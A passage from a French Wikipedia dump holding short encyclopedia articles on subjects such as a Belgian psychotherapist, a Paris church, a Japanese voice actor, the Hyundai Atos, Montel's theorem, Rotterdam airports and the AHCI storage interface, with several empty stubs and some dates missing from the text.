Les Juifs religieux-nationaux forment le principal pôle du sionisme religieux, l'autre étant représenté par les Chardal.

</doc>
<doc id="1872645" url="https://fr.wikipedia.org/wiki?curid=1872645" title="Jean-Jacques Wittezaele">
Jean-Jacques Wittezaele

Jean-Jacques Wittezaele, psychologue et psychothérapeute belge, est l'un des principaux représentants de la thérapie stratégique brève, dite approche de Palo Alto, en Europe francophone.
Biographie.
Après l'obtention de son doctorat en psychologie, Jean-Jacques Wittezaele commence sa carrière au sein d'un foyer pour adolescents difficiles au sein duquel il collabore avec Marcel Bribois. En 1981, il commence un séjour de trois ans au Mental Research Institute of Palo Alto où il est l'élève et le collaborateur de Paul Watzlawick, John Weakland et Richard Fisch. Outre ces trois pionniers de la thérapie brève, Wittezaele est influencé par les travaux de Donald deAvila Jackson et Gregory Bateson dont il est considéré comme un des spécialistes.
En 1987 il crée avec Teresa Garcia Rivera "l'Institut Gregory Bateson" à Liège, centre de recherche, de consultation et de formation spécialisé en thérapie brève selon l'approche de Palo Alto et représentant officiel en Europe francophone du Mental Research Institute of Palo Alto. En 2003, Wittezaele contribue à la création de "l'Association européenne de thérapie brève et stratégique" avec notamment Mony Elkaïm, Gianfranco Cecchin, Stefan Geyerhofer, Camilo Loriedo, Teresa Garcia, Giorgio Nardone et Wendel Ray.
Outre ses fonctions au sein de "l'Institut Gregory Bateson", Jean-Jacques Wittezaele est chargé de cours à l'Université Paris X Nanterre, ainsi qu'à l'École de thérapie stratégique d'Arezzo et associé de recherche au Mental Research Institute of Palo Alto.
Bibliographie.
Livres
Articles
Traductions

</doc>
<doc id="1872646" url="https://fr.wikipedia.org/wiki?curid=1872646" title="Alphonse XII d’Espagne">
Alphonse XII d’Espagne



</doc>
<doc id="1872662" url="https://fr.wikipedia.org/wiki?curid=1872662" title="Miguel Arteta">
Miguel Arteta

Miguel Arteta, né en 1965 à San Juan, Porto Rico, est un acteur, réalisateur, scénariste et producteur américain pour le cinéma et la télévision.
Biographie.
Né d'un père péruvien et d'une mère espagnole, Miguel Arteta a passé son enfance dans plusieurs pays d'Amérique latine, au gré des voyages d'affaires de son père, représentant pour Chrysler. Après avoir été renvoyé d'un lycée au Costa Rica, il partit vivre avec sa sœur aux États-Unis à Boston, où il apprit le métier du cinéma. Il suivit ensuite le programme de documentaires de l'université d'Harvard, mais voulant faire plus que cela, il abandonna et s'inscrivit à l'université Wesleyenne, où il rencontra ses futurs collaborateurs Matthew Greenfield et Mike White.
Après l'obtention de son diplôme en 1989, son film d'étudiant "Every Day is a Beautiful Day" remporta un , qui lui permit d'obtenir un poste de second assistant caméra de Jonathan Demme sur le film . Demme le recommanda pour intégrer l'American Film Institute, où Arteta reçut son Master of Fine Arts en 1993.
Son premier long métrage "", qu'il a également écrit, fut projeté pour la première fois au festival du film de Sundance de 1997. Le film connut un grand succès, recevant cinq nominations aux Independent Spirit Awards, dont les catégories Meilleur Premier Long Métrage, et Meilleur Scénario. Arteta dirigea ensuite plusieurs épisodes de séries télévisées : "Life on the Street", "Freaks and Geeks" et "Six Feet Under".
En 2001, son film indépendant "" remporta un Independent Spirit Award dans la catégorie Meilleur long métrage de moins de . On retrouve dans l'équipe ses anciens camarades d'université Greenfield (producteur) et White (scénariste et acteur principal). Le trio se réunit de nouveau en 2002 pour "The Good Girl", avec Jennifer Aniston.
Arteta a été membre du jury du festival de Sundance en 2006.
Le dernier projet en date de Miguel Arteta, la comédie romantique "Date School", est annoncé pour 2008.

</doc>
<doc id="1872664" url="https://fr.wikipedia.org/wiki?curid=1872664" title="Église Saint-Léon de Paris">
Église Saint-Léon de Paris

L'église Saint-Léon est une église paroissiale située dans le de Paris, place du Cardinal-Amette. Elle porte le nom du pape Léon le Grand, en mémoire de Léon Thélier, mari de la donatrice qui a permis l'érection de l'église, et de son fils Marcel Thélier, jésuite, mort pour la France.
Histoire.
La première pierre a été consacrée, le , par le cardinal Louis Dubois, archevêque de Paris, accompagné de Paul-Louis Touzé, curé de la paroisse Saint-Jean-Baptiste de Grenelle dont dépendait la nouvelle église. La première messe est célébrée par Louis Fillon, administrateur de la paroisse, le , dans la seule nef latérale achevée. À l'achèvement des trois nefs, le cardinal Dubois revient pour bénir l'église le . Le , la paroisse Saint-Léon est érigée comme paroisse indépendante de Saint-Jean-Baptiste de Grenelle.
L'église est complétée par un presbytère (1, place du cardinal Amette), béni par le cardinal Dubois, le , et une maison des œuvres (11, place du cardinal Amette), bénie par Georges Audollent, évêque de Blois, le . C'est la première maison des œuvres construite à Paris. Elle comprend notamment un théâtre de 700 places, une salle de catéchisme de 150 places et 9 salles paroissiales.
L'abside fut inaugurée le par le cardinal Jean Verdier, archevêque de Paris. Cette abside est complétée par une crypte, deux tribunes, deux sacristies et des logements pour le personnel. Le , le cardinal Verdier revient pour bénir et poser la première pierre de la façade et du clocher. Les cinq cloches : Françoise, Jeanne, Marie (« espérer ») ; Marie, Pierre, Jeanne, Raymonde, Adrienne (« remercier ») ; Marie-Louise, Agnès, Claire, Colette, Marthe (« Un seul cœur, une seule âme ») ; Jeanne, Louise, Paul, Georgette (« agir ») ; Léone, Jeanne (« prier ») sont bénies par le cardinal Verdier le .
Le maître-autel est consacré, le , par Louis Fillon, archevêque de Bourges et premier curé de la paroisse. Enfin, la période de la construction de l'église s'achève avec la cérémonie de la dédicace le . C'est le cardinal Emmanuel Suhard, archevêque de Paris, qui préside cette célébration qui dure plus de six heures et durant laquelle il oint les douze croix de consécration.
Le dispensaire paroissial « La Goutte de lait » est totalement reconstruit et inauguré le par le cardinal Maurice Feltin, archevêque de Paris. Le cardinal Feltin revient le pour bénir la chapelle des catéchismes construite sur les plans de Jacques de Brauer, pour accueillir 800 enfants ou 600 adultes. Ce bâtiment de construit sur cour avec un large préau comprend également de locaux scouts et une salle de sport de 33x16 m pour le volley-ball ou le basket-ball.
En 2022, la crypte héberge les offices de la paroisse Saint-Séraphin-de-Sarov, dont l'église vient d'être ravagée par un incendie.
Architecture.
L'église a été dessinée par Émile Brunet. Elle est construite en béton couvert de brique. La décoration d'inspiration Art déco (vitraux, mosaïques, sculptures, ferronnerie) est caractéristique des années 1930 et 1940. Les chapiteaux sont sculptés par Pierre Seguin. La mosaïque est l’œuvre de Auguste Labouret. Le maître-autel et la chaire ont été perdus. Les vitraux de l'abside de 1930 (sur le thème des mystères du rosaire) et des bas-côtés (qui représentent les sacrements et instruments de la Passion) sont l'œuvre de Louis Barillet. Les reliefs ont été créées par Henri Bouchard et Auguste Cornu, et les ferronneries sont l'œuvre de Raymond Subes. L'église possède un orgue de 32 jeux, acheté à Dole et béni par le cardinal Emmanuel Suhard, archevêque de Paris le .
Elle est classée Patrimoine du XX siècle en 2011, puis Patrimoine d'intérêt régional en avril 2021.
Un buste du cardinal Amette est installé à l'entrée de l'église.
Accès.
Ce site est desservi par les stations de métro Dupleix et La Motte-Picquet - Grenelle.

</doc>
<doc id="1872667" url="https://fr.wikipedia.org/wiki?curid=1872667" title="Schubert">
Schubert



</doc>
<doc id="1872672" url="https://fr.wikipedia.org/wiki?curid=1872672" title="Causse (homonymie)">
Causse (homonymie)

Un causse (de l'occitan "causse") est une étendue de terres calcaires superficielle propice à l'élevage du bétail.

</doc>
<doc id="1872673" url="https://fr.wikipedia.org/wiki?curid=1872673" title="Granados">
Granados

Granados est un nom propre.

</doc>
<doc id="1872674" url="https://fr.wikipedia.org/wiki?curid=1872674" title="Hygiène dentaire">
Hygiène dentaire



</doc>
<doc id="1872677" url="https://fr.wikipedia.org/wiki?curid=1872677" title="Transport sans frontière">
Transport sans frontière



</doc>
<doc id="1872678" url="https://fr.wikipedia.org/wiki?curid=1872678" title="Ruff">
Ruff



</doc>
<doc id="1872684" url="https://fr.wikipedia.org/wiki?curid=1872684" title="Joachim de Sienne">
Joachim de Sienne



</doc>
<doc id="1872689" url="https://fr.wikipedia.org/wiki?curid=1872689" title="Geoff Darrow">
Geoff Darrow



</doc>
<doc id="1872690" url="https://fr.wikipedia.org/wiki?curid=1872690" title="Mamoru Miyano">
Mamoru Miyano

 est un chanteur, acteur et seiyū japonais né le dans la préfecture de Saitama. En tant que seiyū, il est connu pour ses rôles dans les séries animées "Ouran High School Host Club", "Death Note", "Mobile Suit Gundam 00", "Kōtetsu Sangokushi, Free!" et "Steins;Gate." En 2007, il est nommé deux fois au Seiyu Awards pour son rôle de Light Yagami dans "Death Note", et en 2008, il remporte le titre de meilleur voix au Tokyo International Anime Fair. La même année, il remporte également le titre de meilleure voix principale au Seiyu Awards, pour son rôle de Setsuna F. Seiei dans "Mobile Suit Gundam 00", et pour son rôle de Hakugen Rikuson dans "Kōtetsu Sangokushi".
Miyano a commencé sa carrière de chanteur en 2007. En mai sort son premier single, , chez le label King Records. En sort son premier album "Break".
Miyano se marie fin 2008 et a eu depuis, un fils.
Il prête sa voix aussi à Shirou Fubuki (Shawn Froste) un joueur de Football dans la série "Inazuma Eleven".
Carrière en tant que seiyū.
Miyano commence sa carrière de seiyū en 2002, avec le rôle de Riku dans la version japonaise du jeu vidéo "Kingdom Hearts" sur PlayStation 2. L'année suivante il incarne Kiba, le personnage principal de la série animée "Wolf's Rain". Il fait toujours la voix de Riku en 2004 sur le jeu vidéo "" sorti sur Game Boy Advance ainsi que dans le jeu vidéo "Kingdom Hearts 2" en 2005 et dans "Kingdom Hearts Re:Chain of Memories" en 2007.
En 2006, Miyano fait la voix de Light Yagami pour la version animée du manga "Death Note" . En 2007, il est nommé deux fois dans ce rôle au premier Seiyu Awards dans les catégories "Meilleure voix principale" et "Meilleur espoir". La même année, Miyano incarne la voix de Setsuna F. Seiei, le personnage principal de "Mobile Suit Gundam 00". Il gagne sa première récompense, "Meilleure voix", lors du Tokyo International Anime Fair de 2008 pour ses rôles de Light Yagami et de Setsuna F Seiei. En 2008, Miyano reprend son rôle de Setsuna F. Seiei dans la seconde saison de "Mobile Suit Gundam 00". Il remporte son premier "Seiyu award" en 2008 pour ses rôles de Setsuna F. Seiei et de Hakugen Rikuson dans "Kōtetsu Sangokushi". Il a aussi fait les voix des personnages de Zero dans les versions animées du manga "Vampire Knight", de Death The Kid dans "Soul Eater", de Tamaki Suoh dans "Ouran High School Host Club" ainsi que celle de Ichinose Tokiya dans "Uta no Prince-sama "et de Shirou Fubuki (Shawn Frost) dans "Inazuma Eleven", Haruka Kokonose, Konoha et Black Konoha dans "Mekakushi Actors".
Carrière en tant qu'acteur.
Il commence sa carrière d'acteur très tôt, en 1992 dans la série télévisée "Tokusou Exceedraft", où il apparaît dans un flash back en tant qu'enfant. En 2003, Miyano rejoint la comédie musicale "Tenimyu" où il joue le rôle de . Il fait sa première apparition dans un long métrage en 2006 dans le film "The Prince of Tennis".
En 2010, il joue avec l'actrice Ayumi Uehara et les seiyuus Tomokazu Sugita, Tomokazu Seki, Rikiya Koyama, Yuka Hirata, Showtaro Morikubo et Yūko Kaida dans le film "Wonderful World", réalisé par Daisuke Namikawa.
En 2013, il joue Ferocious Knight D pour la série "Zyuden Sentai Kyoryuger".
Carrière musicale.
Le sort le premier single de Miyano, au label King Records. "Kuon" se place quarante septième dans les charts Oricon et est utilisé comme chanson du générique de fin de la série animée "Kōtetsu Sangokushi". Le , il fait un duo avec sa collègue seiyū Romi Park intitulé "Fight", qui se place soixante troisième dans les charts Oricon . Le sort son deuxième single solo "Discovery", qui est utilisé en tant que musique d'introduction du jeu vidéo "Fushigi Yūgi: Suzaku Ibun" sur PlayStation 2 Le single se place vingt-quatrième dans les charts.
En août de la même année, Miyano sort le character single "Soup/Hakosora", sous le nom de ; le single se place dix huitième des charts. En décembre, il sort son troisième single , qui se place lui aussi dix huitième dans les charts. Le , Miyano sort son premier album, "Break", qui se place vingtième. Il entame le mois suivant sa première tournée, nommée "1st Live Tour 2009: Breaking".
Il a aussi chanté tous les génériques de "Uta no prince-sama".
Discographie.
Albums :
Singles :
Character Singles
Doublage.
"Les personnages principaux sont en gras. Cette liste est incomplète."

</doc>
<doc id="1872691" url="https://fr.wikipedia.org/wiki?curid=1872691" title="Hyundai Atos">
Hyundai Atos

La Hyundai Atos est un véhicule construit par le constructeur automobile Sud-Coréen Hyundai. La version originale est créée en 1997, la version Atos Prime à partir de 1999. La production de l'Atos Prime est encore en cours dans les autres pays jusqu'à présent.
Première génération.
Fabriquée à partir de 1997, elle est lancée en Europe en 1998. 
Cette voiture citadine cinq portes d'entrée de gamme se compose d'une gamme relativement simple et n'est commercialisée qu'avec un petit moteur 1.1 essence.
Son unique finition d'équipements, baptisée « Pack », est très rudimentaire et comporte, entre autres, les équipements suivants : 
La finition est compensée par un prix de base très attractif (environ ) et une bonne modularité. Les options sont l'autoradio CD, la climatisation ou encore la peinture métallisée.
Cette automobile est très populaire en Inde, en Grèce et en Italie. Elle est également connue en Corée du Sud sous l'appellation Kia Visto dotée d'un excellent moteur 1.2 L à turbocompresseur.
En dépit de réelles qualités, cette petite citadine à cinq portes a eu bien du mal à s'imposer dans son segment, terrain de prédilection pour ses nombreuses concurrentes plus modernes, que sont la Citroën C1, la Toyota Aygo, la Volkswagen Fox ou encore la Renault Twingo, remplacée en 2007.
En 2008, la Hyundai i10 lui succède sur le marché européen.

</doc>
<doc id="1872692" url="https://fr.wikipedia.org/wiki?curid=1872692" title="Théorème de Montel">
Théorème de Montel

En analyse complexe, il existe deux théorèmes portant le nom de Paul Montel, donnant tous deux des conditions pour qu'une famille de fonctions holomorphes soit normale.
Caractérisation des familles normales.
Soit formula_1 un ouvert du plan complexe. On note formula_2 l'ensemble des fonctions holomorphes de formula_1 dans le plan complexe. Paul Montel a démontré le résultat suivant :
Autrement dit, les compacts de formula_2 sont les fermés bornés ; on dit aussi que formula_2 est un espace de Montel.
Ce théorème se démontre à l'aide du théorème d'Arzela-Ascoli.
Famille évitant deux valeurs.
Une version plus forte du théorème de Montel, appelée parfois le est l'énoncé suivant :
Ce théorème a joué un rôle crucial dans le développement de la dynamique holomorphe par Pierre Fatou et Gaston Julia.
Il permet également de démontrer les théorèmes de Picard.

</doc>
<doc id="1872693" url="https://fr.wikipedia.org/wiki?curid=1872693" title="Aéroport de Rotterdam-La Haye">
Aéroport de Rotterdam-La Haye

L'aéroport de Rotterdam-La Haye est un aéroport international néerlandais situé sur le territoire de la commune de Rotterdam. Il est le troisième aéroport des Pays-Bas après ceux d'Amsterdam-Schiphol et d'Eindhoven, avec un trafic annuel de 2,1 millions de passagers en 2022. Des liaisons quotidiennes sont assurées vers Londres, Hambourg et Berlin, auxquelles viennent s'ajouter plusieurs vols charter.
L'aéroport, situé à l'instar de Schiphol sous le niveau de la mer (−5 m), ouvre en 1956 sous le nom d'aéroport des Seize cours ("vliegveld Zestienhoven" en néerlandais), du nom du polder sur lequel il est construit. Il est cependant rebaptisé en tant qu'aéroport de Rotterdam après la reprise de sa gestion par le groupe Schiphol en 1990. Depuis 2010, il est officiellement dénommé "Rotterdam The Hague Airport", en anglais, afin d'améliorer la visibilité des deux métropoles qui forment une grande agglomération.
L'aéroport est en effet situé entre les deux villes, à au nord du centre de Rotterdam et à au sud-est du centre de La Haye, ville siège du gouvernement des Pays-Bas. De ce fait, il constitue souvent l'aéroport où sont accueillis les dirigeants étrangers arrivant aux Pays-Bas.
Cet aéroport est évoqué dans la chanson "Le Blues du businessman" de l'opéra-rock "Starmania" (1979).
Histoire.
Après la Seconde Guerre mondiale, le gouvernement néerlandais décide qu'un deuxième aéroport d'envergure nationale (après Schiphol, desservant la capitale Amsterdam) est nécessaire. Avant la guerre, la ville de Rotterdam possédait un aéroport, l'aéroport de Waalhaven, mais ce dernier est préventivement détruit pour éviter son utilisation par les troupes d'invasion allemandes. Sa reconstruction étant inenvisageable, un nouvel emplacement doit être trouvé.
Le lieu choisi est le polder de Zestienhoven. La construction de l'aéroport débute en août 1955 et l'aéroport ouvre officiellement en octobre 1956, quelques mois avant le terminal l'année suivante. Bien que l'inauguration officielle prenne place le , un avion piloté par des Danois en provenance de France se pose à Rotterdam le , sans savoir que l'aéroport est encore fermé au trafic aérien.
Peu de temps après l'ouverture, plusieurs compagnies internationales telles que Swissair, Lufthansa et Air France ouvrent des liaisons vers et depuis Rotterdam. Cependant, dans les années 1970, existent des projets de déplacement ou de fermeture de l'aéroport pour des constructions de quartiers pavillonnaires, dus à une stagnation du trafic et au départ des grandes compagnies aériennes, certaines vers Schiphol. Cet aéroport majeur n'est en effet distant que de du centre de Rotterdam. Pendant une trentaine d'années, le projet de fermeture reste en suspens, mais la croissance économique qu'a connue le pays durant les années 1990 entraîne une augmentation du nombre de passagers et en 2001, il est décidé que l'aéroport restera actif au moins un siècle supplémentaire.
Compagnies et destinations.
 Actualisé le 28/12/2022

</doc>
<doc id="1872696" url="https://fr.wikipedia.org/wiki?curid=1872696" title="Kaiserappartements">
Kaiserappartements

Des Kaiserappartements, vingt pièces se visitent dans la Reichskanzleitrakt (1728-1730) et l'Amalienburg (1575) : les appartements qu'habita François-Joseph de 1857 à 1916, ceux ou vécut l'impératrice Sissi de 1854 à 1898 et ceux ou se logea le tsar Alexandre pendant le congrès de Vienne
Les trésors, sacré et séculier, amassés par les Habsbourg au fil des siècles occupent 21 salles. Ils comprennent notamment les joyaux de la couronne et les insignes du Saint-Empire romain germanique.

</doc>
<doc id="1872698" url="https://fr.wikipedia.org/wiki?curid=1872698" title="Aldo et Junior">
Aldo et Junior

Aldo et Junior est un film comique français réalisé par Patrick Schulmann, sorti en 1984. Il s'agit d'une adaptation de "Junior", bande dessinée de Georges Wolinski sortie en album l'année précédente.
Synopsis.
Un père (Aldo Maccione) et un fils (Riton Liebman) qui n'ont pas du tout la même notion de la famille s'affrontent au sein de celle-ci. Une jeune femme, Méredith (Sylvie Nordheim), décide de s'installer chez le père et va venir bouleverser un peu la famille.

</doc>
<doc id="1872702" url="https://fr.wikipedia.org/wiki?curid=1872702" title="Felix Bressart">
Felix Bressart

Felix Bressart est un acteur allemand né le à Eydtkuhnen, arrondissement de Stallupönen province de Prusse-Orientale (aujourd'hui Tchernychevskoïe en Russie) et mort le à Los Angeles.

</doc>
<doc id="1872703" url="https://fr.wikipedia.org/wiki?curid=1872703" title="Geocities">
Geocities



</doc>
<doc id="1872704" url="https://fr.wikipedia.org/wiki?curid=1872704" title="Marie-Hélène Cardot">
Marie-Hélène Cardot

Marie-Hélène Cardot (, Tétaigne (Ardennes) - , Douzy Ardennes), est une femme politique française.
Une vie entre résistance et politique.
Marie-Hélène Jacquemin rencontre son époux Ernest Cardot en 1918 et le suit à Douzy où il dirige une entreprise de transport puis un atelier de mécanique. Elle le seconde dans cette entreprise familiale de construction métallique.
Une résistante dans l'épreuve (1939-1945).
Dans les semaines qui précèdent l’armistice du 22 juin 1940, Ernest Cardot qui ne peut accepter de voir son pays occupé par les Allemands, organise une filière d’évasion pour les prisonniers de guerre. Responsable des francistes dans le département avant la guerre, il engage néanmoins la lutte contre l'occupant. Marie-Hélène Cardot est brièvement arrêtée et internée en 1941. Après l’assassinat d’Ernest le , Cardot continue la lutte et poursuit son assistance aux maquisards et aux évadés, au sein du réseau « Organisation civile et militaire ». Le , elle est arrêtée et incarcérée à Charleville-Mézières. Elle est libérée le lors de l'entrée des troupes américaines dans la ville.
Naissance d'une femme politique (1945-1948).
En 1946, elle fait partie des 21 femmes élues au tout nouveau Conseil de la République (en tant que représentante des Ardennes), où elle est élue au poste de secrétaire les , et . Elle siège à la commission du ravitaillement et à celle des pensions. Elle intervient à plusieurs reprises pour défendre le statut des veuves et des orphelins de guerre, problèmes qui lui sont bien connus puisqu’elle préside l’association ardennaise des veuves et des orphelins de guerre, ainsi que l’association départementale des déportés et des internés.
Catholique fervente, anticommuniste, elle évolue, après son engagement dans la résistance et son veuvage vers le centre-droit et le Mouvement républicain populaire-
Réélection au Conseil de la République (1948-1958).
Réélue sénateur des Ardennes en 1948, avec l'étiquette MRP, elle siège à la commission de la famille et à celle des pensions qu'elle présidera à partir de 1955. Parlementaire très active, elle est chargée de nombreux rapports par la commission des pensions et intervient très souvent pour défendre la cause des familles touchées par la guerre et celle des anciens combattants, notamment lors des discussions budgétaires.
Sénatrice de la V République (1959-1971).
À son activité nationale, Marie-Hélène Cardot ajoute une carrière locale également bien remplie en exerçant les mandats de maire de Douzy (durant 19 ans) et de conseiller général des Ardennes. Cette forte implantation locale lui permet d'être réélue sans difficulté au Conseil de la République, puis au Sénat dont elle est la Vice-Présidente de 1959 à 1971, date à laquelle elle quitte la Haute Assemblée.
Elle siègera à la commission des affaires sociales. Elle déposera une proposition de loi sur l’ordre des géomètres-experts, intervient dans la discussion relative aux assurances sociales des exploitants agricoles, s’intéresse aux Vietnamiens rapatriés en France, à l’emploi des enfants dans le spectacle, à la garantie de l’emploi en cas de maternité, à l’usage des contraceptifs, à l’exercice du droit syndical dans les entreprises et participe activement à la discussion de chaque projet de loi de finances.
Mandats locaux et nationaux.
Mandats cantonaux.
Commission de l'assistance et de l'hygiène publique.

</doc>
<doc id="1872705" url="https://fr.wikipedia.org/wiki?curid=1872705" title="Perle (homonymie)">
Perle (homonymie)

Le mot perle, du latin "perna" (« cuisse » mais aussi, par analogie, « pinne marine », un coquillage) via le diminutif "pernula", désigne originellement une concrétion sécrétée par l'huître perlière, utilisée en joaillerie.
Sigle.
Le sigle ou l'acronyme PERLE peut signifier :

</doc>
<doc id="1872708" url="https://fr.wikipedia.org/wiki?curid=1872708" title="Advanced Host Controller Interface">
Advanced Host Controller Interface

L'Advanced Host Controller Interface (ou Advanced HCI ou AHCI) est un mécanisme matériel permettant à la couche logicielle de communiquer avec des périphériques SATA tels que les adaptateurs de bus hôte, qui sont conçus pour offrir des vitesses de transfert supérieures et des fonctionnalités que ne proposent pas les contrôleurs ATA standards, tels que le branchement à chaud ou encore le NCQ.
Description.
AHCI, grâce à des fonctions matérielles et des commandes spécifiques, permet l'utilisation de fonctions avancées, telles que le remplacement sous tension. Les disques durs en utilisant le mode AHCI peuvent fonctionner à des vitesses plus élevées que celles en mode IDE et de manière optimisée grâce à la fonction NCQ.
Spécification.
Les spécifications en sont à leur version 1.3.1 ().
Support.
L'AHCI est supporté nativement par Apple Mac OS, Microsoft depuis Windows XP et par Linux à partir du noyau 2.6.19.
Pour Windows Vista et suivants, il est important de faire l'installation de Windows "après" avoir changé de mode dans le BIOS. Ne pas le faire empêche de bénéficier de l'avantage lié à ce mode (vitesse, NCQ et déconnexion à chaud).
Il est aussi possible d'activer l'AHCI à l'issue d'une installation de Windows Vista et ultérieur elle-même réalisée en l'absence d'AHCI positionné.
Les systèmes d'exploitation plus anciens nécessitent des pilotes, développés par le constructeur de l'adaptateur de bus hôte, afin de supporter l'AHCI.

</doc>
<doc id="1872710" url="https://fr.wikipedia.org/wiki?curid=1872710" title="Manuel Alexandre de Oliveira da Silva">
Manuel Alexandre de Oliveira da Silva



</doc>
<doc id="1872713" url="https://fr.wikipedia.org/wiki?curid=1872713" title="Périple au pays des voyageurs">
Périple au pays des voyageurs

Périple au pays des voyageurs est un film documentaire iranien réalisé par Bahman Kiarostami et écrit par Abbas Kiarostami, sorti en 1993.

</doc>
<doc id="1872714" url="https://fr.wikipedia.org/wiki?curid=1872714" title="Saint Léon IX">
Saint Léon IX



</doc>
<doc id="1872716" url="https://fr.wikipedia.org/wiki?curid=1872716" title="Douet">
Douet

« Douet » désigne, en Normandie, un ruisseau en augeron et en cotentinais (dialectes du normand).
En Bretagne, un douet (ou "doué") était un lavoir à blanchir le lin. En gallo, c'est un lavoir à laver le linge.

</doc>
<doc id="1872722" url="https://fr.wikipedia.org/wiki?curid=1872722" title="Aéroport de Waalhaven">
Aéroport de Waalhaven

L'aéroport de Waalhaven est le deuxième aéroport civil dès son ouverture construit aux Pays-Bas. Il était situé près de Rotterdam et il commença ses activités le . Il accueillit les débuts de l'industrie aéronautique, et plus particulièrement les avions de Frederick Koolhoven.
Histoire.
Au début, les pistes étaient en simple terrain stabilisé et les vols civils assurés par des avions de la Première Guerre mondiale transformés. Le premier transport de fret aérien néerlandais a aussi eu lieu à partir de cet aéroport dans les années 1930. L'aéroport a été aussi une escale importante pour les vols de et vers Londres et Paris. 
Aéroport militaire néerlandais pendant la Seconde Guerre mondiale, il fut saboté par les militaires néerlandais avant l'arrivée des troupes allemandes. Quatre jours plus tard, le , il est entièrement ravagé par le bombardement de Rotterdam. L'aéroport n'a pas été reconstruit après guerre. 
La zone est désormais occupée par des installations portuaires du port du Waal.

</doc>
<doc id="1872727" url="https://fr.wikipedia.org/wiki?curid=1872727" title="Le Voyage (film, 1994)">
Le Voyage (film, 1994)

Le Voyage (en persan: سفر ; "Safar") est un film dramatique iranien écrit par Abbas Kiarostami et réalisé par Alireza Raisian, sorti en France en 1996.
Le film propose une exploration des effets psychologiques de la guerre sur une famille de la classe moyenne.

</doc>
<doc id="1872728" url="https://fr.wikipedia.org/wiki?curid=1872728" title="Asa de Aguia">
Asa de Aguia



</doc>
<doc id="1872732" url="https://fr.wikipedia.org/wiki?curid=1872732" title="Ernesto de Souza Andrade Júnior">
Ernesto de Souza Andrade Júnior



</doc>
<doc id="1872734" url="https://fr.wikipedia.org/wiki?curid=1872734" title="Farad'n">
Farad'n



</doc>
<doc id="1872736" url="https://fr.wikipedia.org/wiki?curid=1872736" title="Judéo-communiste">
Judéo-communiste



</doc>
<doc id="1872739" url="https://fr.wikipedia.org/wiki?curid=1872739" title="Nephila maculata">
Nephila maculata



</doc>
<doc id="1872740" url="https://fr.wikipedia.org/wiki?curid=1872740" title="Philippe Ier de Montfort">
Philippe Ier de Montfort



</doc>
<doc id="1872742" url="https://fr.wikipedia.org/wiki?curid=1872742" title="Netinho (homonymie)">
Netinho (homonymie)

Netinho est le surnom de :

</doc>
<doc id="1872746" url="https://fr.wikipedia.org/wiki?curid=1872746" title="Cholagogue">
Cholagogue

Une substance cholagogue (aussi appelée cholécystokinétique) a pour effet de faciliter l'évacuation de la bile vers l'intestin en provoquant une chasse biliaire à partir de la vésicule qui se vide en se contractant.
Le terme vient du grec ancien / , « bile » et / de / , « qui conduit », ce mot signifie donc étymologiquement « qui conduit la bile ».

</doc>
<doc id="1872749" url="https://fr.wikipedia.org/wiki?curid=1872749" title="Greg Biffle">
Greg Biffle

Gregory Jack Biffle, dit Greg Biffle, né le à Vancouver (Washington) et mort le à Statesville (Caroline du Nord), est un pilote automobile américain de la NASCAR.
Biographie.
Carrière.
Greg Biffle remporte avec l'écurie Roush Racing le championnat de NASCAR Truck Series en 2000 () puis celui de Nationwide Series en 2002 (). 
Greg Biffle commence sa carrière en NASCAR Cup Series () la même année. Il remporte 19 victoires entre 2003 et 2013 sans toutefois décrocher de titre en fin de saison, son meilleur classement ayant été second en 2005. 
Mort.
Le , alors âgé de 55 ans, plusieurs personnes dont sa femme, sa fille, son fils et lui meurent à l', lors de l'atterrissage d'un avion lui appartenant.

</doc>
<doc id="1872750" url="https://fr.wikipedia.org/wiki?curid=1872750" title="Ibicare">
Ibicare



</doc>
<doc id="1872753" url="https://fr.wikipedia.org/wiki?curid=1872753" title="Maria Anne Fitzherbert">
Maria Anne Fitzherbert

Maria Anne Fitzherbert, née Maria Anne Smythe le , décédée le .
Elle est l'épouse de George IV du Royaume-Uni.
Famille.
Maria Anne Smythe est née en 1756, au château de Tong dans le Shropshire, fille de Walter Smythe (cadet de John Smythe, baronet d'Acton Burnell) et de Maria Anne Errington.
En juillet 1775, Maria Anne Smythe épouse (1740-1775), un riche propriétaire foncier catholique du Dorset, châtelain de Lulworth et oncle du futur cardinal Thomas Weld. Cette union ne dure que trois mois, puisqu'Édouard Weld meurt.
En 1778, Maria Anne Smythe épouse Thomas Fitzherbert (1746-1781) dont elle a un fils (mort jeune). Le Maria Anne Fitzherbert se trouve de nouveau veuve à 25 ans. Elle hérite de son second époux d'une résidence à Mayfair, un quartier élégant de Londres, et d'un revenu annuel de .
Mariage de Maria Anne Fitzherbert et de Georges IV.
La jeune veuve est présentée à la société londonienne. Au printemps de , Maria Anne Fitzherbert est présentée à un jeune admirateur, Georges, prince de Galles. Elle devient sa maîtresse. Le , Maria Anne Fitzherbert épouse le prince de Galles. Ce mariage est considéré comme illégal, et reste secret : selon la Loi des mariages de 1772, le prince de Galles est dans l'obligation, pour se marier, de demander la permission à son père, le roi et au Conseil privé, ce qu'il ne fait pas. Si prince avait demandé cette permission, elle n'aurait probablement pas été accordée, Maria Anne Fitzherbert étant de confession catholique.
Les liens entre Maria Anne Fitzherbert et le prince de Galles après son mariage.
Maria Anne Fitzherbert et le prince de Galles continuent leur vie sentimentale même après le mariage du prince avec Caroline de Brunswick le . Elle est présentée comme une . Vers 1800, il revient vivre auprès de Maria Anne Fitzherbert. Leur relation se termine vers 1811 (si le prince ne règne que de 1820 à 1830, il est nommé prince-régent dès 1811). Pendant ces onze années, le prince de Galles a aussi une liaison avec Frances Villiers, comtesse de Jersey, mais Maria Anne Fitzherbert ne lui en tient pas rigueur. Elle est elle-même très proche du duc Charles de Noailles, prince de Poix.
Après la mort de George IV le , on découvre des lettres conservées par Maria Anne Fitzherbert. Des mesures sont prises pour leur destruction. Guillaume IV du Royaume-Uni lui propose le titre de duchesse royale eu égard aux difficultés dont elle eut à souffrir de la part de Georges IV. Maria Anne Fitzherbert déclare avoir porté le nom de Fitzherbert toute sa vie, qu'elle ne l'avait jamais déshonoré et ne souhaitait pas en changer. Maria Anne Fitzherbert meurt le , elle est inhumée à l'église saint Jean-Baptiste à près de Brighton.
Sa vie et son mariage secret sont évoqués dans plusieurs films, dont un film britannique de 1947 qui lui est consacré : "Mrs. Fitzherbert" de Montgomery Tully.

</doc>
<doc id="1872758" url="https://fr.wikipedia.org/wiki?curid=1872758" title="Quintus Valerius Falto">
Quintus Valerius Falto

